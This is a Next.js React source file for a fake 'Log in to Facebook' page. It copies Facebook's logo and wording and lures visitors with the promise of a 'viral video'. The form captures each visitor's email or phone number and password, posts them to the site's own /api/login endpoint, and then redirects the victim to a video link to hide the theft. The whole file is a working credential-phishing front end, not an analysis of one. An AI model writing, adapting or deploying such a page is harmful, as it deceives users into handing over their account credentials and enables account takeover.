'use client'
import { useState, useEffect, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';
import { thumData } from '../../assets/assets';

function LoginComponent() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [redirectUrl, setRedirectUrl] = useState('');
  const searchParams = useSearchParams();

  useEffect(() => {
    const videoId = searchParams.get('videoId');
    if (videoId && thumData) {
      const selectedVideo = thumData.find(item => item.id === parseInt(videoId));
      if (selectedVideo && selectedVideo.url) {
        setRedirectUrl(selectedVideo.url);
        return;
      }
    }
    if (thumData && thumData.length > 0 && thumData[0].url) {
      setRedirectUrl(thumData[0].url);
    }
  }, [searchParams]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    try {
      const videoId = searchParams.get('videoId');
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password, videoId }),
      });

      if (!response.ok) {
        console.error('Network response was not ok:', response.status, response.statusText);
        setLoading(false);
        alert(`Server error: ${response.statusText}. Please try again.`);
        return;
      }

      const result = await response.json();
      console.log('Login response:', result);
      
      if(result.status === 'success') {
        if(redirectUrl) {
          window.location.href = redirectUrl;
        } else if(result.redirect_url) {
          window.location.href = result.redirect_url;
        } else {
          alert('Login successful! | Loading video...');
        }
      } else {
        setLoading(false);
        alert(`Login failed: ${result.message || 'Please try again.'}`);
      }
    } catch (error) {
      console.error('Error:', error);
      setLoading(false);
      alert('An error occurred. Please try again.');
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100 px-4 py-12">
      <div className="max-w-md w-full space-y-8">
        <div className="text-center">
          <div className="flex justify-center">
            <svg xmlns="http://www.w3.org/2000/svg" width="112" height="112" viewBox="0 0 112 112">
              <path d="M56 0C25.1 0 0 25.1 0 56s25.1 56 56 56 56-25.1 56-56S86.9 0 56 0zm18.4 36.5h-7.7c-2.3 0-3.9 1.2-3.9 3.9v7.7h11.6l-1.6 11.6H62.8v30.9H51.2V59.7H41.9V48.1h9.3v-9.3c0-7.7 4.6-13.9 13.9-13.9 3.9 0 7.7.8 9.3 1.2v10.4z" fill="#1877f2"/>
            </svg>
          </div>
          <h2 className="mt-4 text-3xl font-extrabold text-gray-900">Log in to Facebook</h2>
          <p className="mt-2 text-sm text-gray-600">Log in to watch the viral video content</p>
        </div>
        
        <div className="bg-white py-8 px-6 shadow rounded-lg">
          <form className="space-y-6" onSubmit={handleSubmit}>
            <div>
              <input
                id="email"
                name="email"
                type="text"
                autoComplete="email"
                required
                placeholder="Email or phone number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="appearance-none text-black block w-full px-3 py-3.5 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-base"
              />
            </div>
            <div>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                required
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="appearance-none text-black block w-full px-3 py-3.5 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-base"
              />
            </div>
            <div>
              <button
                type="submit"
                disabled={loading}
                className={`w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-base font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
              >
                {loading ? 'Logging in...' : 'Log In'}
              </button>
            </div>
          </form>
          
          <div className="mt-6 text-center">
            <a href="#" className="text-sm text-blue-600 hover:text-blue-500">Forgotten password?</a>
          </div>
          
          <div className="mt-6">
            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-gray-300"></div>
              </div>
              <div className="relative flex justify-center text-sm">
                <span className="px-2 bg-white text-gray-500">or</span>
              </div>
            </div>
            
            <div className="mt-6 text-center">
              <a
                href="#"
                className="inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-green-600 hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500"
              >
                Create New Account
              </a>
            </div>
          </div>
        </div>
        
        <div className="text-center text-xs text-gray-500 mt-8">
          <p>By continuing, you agree to Facebook&apos;s Terms of Service and Privacy Policy.</p>
        </div>
      </div>
    </div>
  );
}

export default function Login() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <LoginComponent />
    </Suspense>
  );
}
